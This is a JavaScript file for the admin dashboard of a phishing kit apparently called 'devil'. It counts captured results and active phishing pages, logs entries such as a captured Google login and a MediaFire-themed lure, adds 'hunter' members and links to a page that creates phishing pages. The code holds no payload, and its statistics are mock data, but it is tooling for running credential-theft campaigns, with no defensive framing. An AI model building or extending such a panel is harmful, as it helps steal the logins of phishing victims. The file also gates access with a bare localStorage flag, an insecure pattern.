// ADMIN DASHBOARD FUNCTIONS

// Check authentication on page load
window.addEventListener('load', function() {
    checkDashboardAuth();
    loadDashboardStats();
});

// Authentication check
function checkDashboardAuth() {
    const auth = localStorage.getItem('devil_auth');
    const user = localStorage.getItem('devil_user');
    
    if (!auth || auth !== 'true' || !user) {
        alert('Access denied! Redirecting to login...');
        window.location.href = '/index.html';
        return false;
    }
    
    // Display current user
    const userElement = document.getElementById('currentUser');
    if (userElement) {
        userElement.textContent = user;
    }
    
    return true;
}

// Load dashboard statistics
function loadDashboardStats() {
    // Mock data for demo
    document.getElementById('totalResults').textContent = '142';
    document.getElementById('totalMembers').textContent = '8';
    document.getElementById('activePhishing').textContent = '5';
    
    // Load recent activities
    const activities = [
        { icon: 'fa-user-check', title: 'New login detected', details: '2 mins ago | IP: 192.168.1.100' },
        { icon: 'fa-fish', title: 'Phishing page created', details: '10 mins ago | MediaFire MP4' },
        { icon: 'fa-database', title: 'New result captured', details: '15 mins ago | Google login' },
        { icon: 'fa-user-plus', title: 'New member added', details: '1 hour ago | Username: hunter1' }
    ];
    
    const activityList = document.getElementById('activityList');
    if (activityList) {
        activityList.innerHTML = activities.map(activity => `
            <div class="activity-item">
                <i class="fas ${activity.icon}"></i>
                <div>
                    <p><strong>${activity.title}</strong></p>
                    <small>${activity.details}</small>
                </div>
            </div>
        `).join('');
    }
}

// Navigation functions
function createPhishingPage() {
    window.location.href = '/admin/create-phishing.html';
}

function viewResults() {
    window.location.href = '/admin/results.html';
}

function addMember() {
    const username = prompt('Enter new member username:');
    const password = prompt('Enter password:');
    
    if (username && password) {
        // In production, send to API
        alert(`Member ${username} added successfully!`);
        loadDashboardStats(); // Refresh stats
    }
}

function openSettings() {
    window.location.href = '/admin/settings.html';
}

// Logout function
function logout() {
    if (confirm('Are you sure you want to logout?')) {
        localStorage.removeItem('devil_auth');
        localStorage.removeItem('devil_user');
        window.location.href = '/index.html';
    }
}

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Ctrl+L to logout
    if (e.ctrlKey && e.key === 'l') {
        logout();
    }
    
    // Ctrl+N to create new page
    if (e.ctrlKey && e.key === 'n') {
        createPhishingPage();
    }
});
